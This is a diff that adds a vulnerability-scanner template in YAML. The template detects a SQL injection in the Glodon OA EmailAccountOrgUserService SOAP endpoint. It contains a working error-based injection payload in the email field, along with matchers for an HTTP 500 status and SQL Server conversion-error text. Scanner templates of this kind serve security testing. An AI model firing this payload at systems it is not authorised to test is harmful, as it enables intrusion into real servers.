@@ -1,0 +1,35 @@
+id: glodon-emailaccountorguserservice-sqli
+info:
+  name: Glodon OA EmailAccountOrgUserService SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL Injection vulnerability in the Glodon OA EmailAccountOrgUserService endpoint.
+http:
+  - raw:
+      - |
+        POST /Mail/Services/EmailAccountOrgUserService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+        <soap:Body>
+        <GetUserInfosByEmail xmlns="http://tempuri.org/">
+        <email>') AND 5452 IN (SELECT (char(112)+char(113)+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113)+char(112)+char(113)+CHAR(113)+CHAR(120)+CHAR(122)+CHAR(112)+CHAR(113))) AND ('oCSe'='oCSe</email>
+        </GetUserInfosByEmail>
+        </soap:Body>
+        </soap:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "将 varchar 值"
+          - "转换成数据类型"
+          - "失败"
+          - "pqqxzpqpqqxzpq"
